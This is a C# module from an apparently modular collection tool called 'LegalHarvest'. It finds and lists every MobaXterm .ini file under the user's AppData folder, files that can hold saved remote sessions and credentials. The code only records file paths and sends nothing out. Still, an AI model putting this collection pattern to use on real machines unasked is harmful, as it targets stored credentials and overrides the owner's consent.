using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class MobaXtermModule : ICollectorModule
    {
        public string ModuleName => "MobaXterm";
        public bool CanExecute()
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MobaXterm");
            return Directory.Exists(path);
        }

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string mobaDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MobaXterm");
            if (Directory.Exists(mobaDir))
                foreach (string file in Directory.GetFiles(mobaDir, "*.ini", SearchOption.AllDirectories))
                    items.Add(new CollectedItem { Category = "MobaXterm", Name = file, Value = file, Timestamp = DateTime.Now });
            return items;
        }
    }
}
